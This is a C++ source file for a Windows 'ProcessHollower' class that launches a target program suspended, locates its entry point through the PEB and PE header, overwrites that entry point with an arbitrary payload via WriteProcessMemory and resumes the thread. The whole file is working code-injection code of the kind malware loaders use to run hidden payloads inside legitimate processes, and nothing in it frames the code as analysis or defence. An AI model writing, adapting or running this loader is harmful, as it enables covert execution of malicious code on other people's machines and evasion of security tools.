#include "process_hollower.hpp"
#include "crypto_funcs.hpp"
#include <iostream>
#include <iomanip>
#include <cstring>

ProcessHollower::~ProcessHollower() {
    if (hThread && hThread != INVALID_HANDLE_VALUE) {
        CloseHandle(hThread);
    }
    if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
    }
}

bool ProcessHollower::create_suspended_process(const wchar_t* target_path) {
    STARTUPINFOEXW si = {};
    PROCESS_INFORMATION pi = {};
    SIZE_T attr_size = 0;

    std::cout << "[*] Target path: " << (target_path ? "valid" : "NULL") << std::endl << std::flush;

    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);

    InitializeProcThreadAttributeList(nullptr, 1, 0, (PSIZE_T)&attr_size);
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, (PSIZE_T)&attr_size);

    // Parent process mitigation
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                             GetCurrentProcess(), sizeof(HANDLE), nullptr, nullptr);

    std::cout << "[*] Creating suspended process..." << std::endl << std::flush;
    BOOL result = CreateProcessW(target_path, nullptr, nullptr, nullptr, FALSE,
                                CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                                nullptr, nullptr, &si.StartupInfo, &pi);

    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

    if (!result) {
        DWORD err = GetLastError();
        std::cout << "[-] CreateProcessW failed: error " << err << std::endl << std::flush;
        return false;
    }

    hProcess = pi.hProcess;
    hThread = pi.hThread;
    processId = pi.dwProcessId;

    std::cout << "[+] Process created: PID " << processId << ", hProcess=" << hProcess << std::endl << std::flush;

    return true;
}

bool ProcessHollower::HollowProcess(const wchar_t* target_exe, const std::vector<uint8_t>& payload) {
    if (!create_suspended_process(target_exe)) {
        std::cout << "[-] Failed to create suspended process\n" << std::flush;
        return false;
    }

    // Get PEB address
    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG ret_len = 0;
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation,
                                               &pbi, sizeof(pbi), &ret_len);
    if (status != 0) {
        std::cout << "[-] NtQueryInformationProcess failed: status 0x" << std::hex << status << std::endl << std::flush;
        return false;
    }
    std::cout << "[+] PEB address: 0x" << std::hex << (uintptr_t)pbi.PebBaseAddress << std::endl << std::flush;

    // Read ImageBase from PEB (offset 0x10)
    uintptr_t image_base = 0;
    SIZE_T bytes_read = 0;
    if (!ReadProcessMemory(hProcess, (PVOID)((uintptr_t)pbi.PebBaseAddress + 0x10),
                          &image_base, sizeof(image_base), &bytes_read)) {
        std::cout << "[-] ReadProcessMemory (ImageBase) failed: error " << std::dec << GetLastError() << std::endl << std::flush;
        return false;
    }
    std::cout << "[+] ImageBase: 0x" << std::hex << image_base << std::endl << std::flush;

    // Read PE header to find entry point
    uint8_t dos_header[0x200] = {};
    if (!ReadProcessMemory(hProcess, (PVOID)image_base, dos_header, sizeof(dos_header), &bytes_read)) {
        std::cout << "[-] ReadProcessMemory (DOS header) failed: error " << std::dec << GetLastError() << std::endl << std::flush;
        return false;
    }
    std::cout << "[+] DOS header read: " << bytes_read << " bytes" << std::endl << std::flush;

    // Get e_lfanew offset to PE header
    uint32_t e_lfanew = *(uint32_t*)(dos_header + 0x3C);
    std::cout << "[+] e_lfanew: 0x" << std::hex << e_lfanew << std::endl << std::flush;

    uint32_t opthdr_offset = e_lfanew + 0x28;  // AddressOfEntryPoint
    uint32_t entry_point_rva = *(uint32_t*)(dos_header + opthdr_offset);
    std::cout << "[+] EntryPoint RVA: 0x" << std::hex << entry_point_rva << std::endl << std::flush;

    uintptr_t entry_point = image_base + entry_point_rva;
    std::cout << "[+] EntryPoint VA: 0x" << std::hex << entry_point << std::endl << std::flush;

    // Write payload at entry point
    SIZE_T bytes_written = 0;
    if (!WriteProcessMemory(hProcess, (PVOID)entry_point,
                           payload.data(), payload.size(), &bytes_written)) {
        std::cout << "[-] WriteProcessMemory failed: error " << std::dec << GetLastError() << std::endl << std::flush;
        return false;
    }

    std::cout << "[+] Payload written: " << std::dec << bytes_written << " / " << payload.size() << " bytes" << std::endl << std::flush;

    // Resume main thread
    DWORD suspend_count = ResumeThread(hThread);
    std::cout << "[+] Thread resumed (suspend count was: " << suspend_count << ")" << std::endl << std::flush;

    return true;
}